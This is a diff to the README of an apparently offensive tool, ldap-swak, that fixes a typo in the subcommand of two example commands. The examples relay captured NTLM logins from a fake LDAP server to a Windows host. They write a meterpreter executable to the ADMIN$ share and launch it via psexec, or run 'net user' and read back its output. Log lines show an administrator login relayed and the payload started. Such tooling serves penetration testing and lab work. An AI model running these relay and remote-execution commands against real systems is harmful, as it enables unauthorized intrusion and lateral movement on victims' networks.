@@ -252,7 +252,7 @@ The order of operations is a convenient write/execute/read.
 
 For example, upload and launch a meterpreter instance:
 ```
-java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
+java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar fake -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
 10:36:53.789 INFO FakeServer - Starting StartTLS listener on *:1389
 10:36:56.278 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
 10:36:56.325 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\foo.exe
@@ -266,7 +266,7 @@ java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.16
 
 Or, execute a system command and get it's output:
 ```
-java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
+java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar fake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
 10:39:09.154 INFO FakeServer - Starting StartTLS listener on *:1389
 10:39:12.564 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
 10:39:12.600 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\launch-1550569151302.cmd
